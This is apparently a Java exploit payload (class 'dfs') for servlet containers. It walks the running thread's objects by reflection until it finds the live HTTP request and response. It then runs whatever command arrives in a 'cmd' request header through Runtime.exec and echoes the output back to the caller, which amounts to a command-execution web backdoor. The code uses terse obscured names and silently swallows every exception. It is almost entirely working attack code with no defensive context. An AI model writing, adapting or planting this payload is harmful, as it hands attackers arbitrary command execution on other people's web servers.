package com.osword.defineclass;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.HashSet;
import java.util.Scanner;


public class dfs {

    static HashSet<Object> h;
    static HttpServletRequest r;
    static HttpServletResponse p;

    public static void main(String[] args) {
        System.out.println("fuck");
        r = null;
        p = null;
        h =new HashSet<Object>();
        F(Thread.currentThread(),0);
    }

//    public dfs(){
//        System.out.println("fuck");
//        r = null;
//        p = null;
//        h =new HashSet<Object>();
//        F(Thread.currentThread(),0);
//    }

    private static boolean i(Object obj){
        if(obj==null|| h.contains(obj)){
            return true;
        }

        h.add(obj);
        return false;
    }
    private static void p(Object o, int depth){
        if(depth > 52||(r !=null&& p !=null)){
            return;
        }
        if(!i(o)){
            if(r ==null&&HttpServletRequest.class.isAssignableFrom(o.getClass())){
                r = (HttpServletRequest)o;
                if(r.getHeader("cmd")==null) {
                    r = null;
                }else{
                    try {
                        p = (HttpServletResponse) r.getClass().getMethod("getResponse").invoke(r);


                    } catch (Exception e) {
                        r = null;
                    }
                }

            }
            if(r !=null&& p !=null){
                try {

                    p.getWriter().println(new Scanner(Runtime.getRuntime().exec(r.getHeader("cmd")).getInputStream()).useDelimiter("\\A").next());
                    p.getWriter().flush();
                    p.getWriter().close();
                }catch (Exception e){
                }
                return;
            }

            F(o,depth+1);
        }
    }
    private static void F(Object start, int depth){

        Class n=start.getClass();
        do{
            for (Field declaredField : n.getDeclaredFields()) {
                declaredField.setAccessible(true);
                Object o = null;
                try{
                    o = declaredField.get(start);

                    if(!o.getClass().isArray()){
                        p(o,depth);
                    }else{
                        for (Object q : (Object[]) o) {
                            p(q, depth);
                        }

                    }

                }catch (Exception e){
                }
            }

        }while(
                (n = n.getSuperclass())!=null
        );
    }

}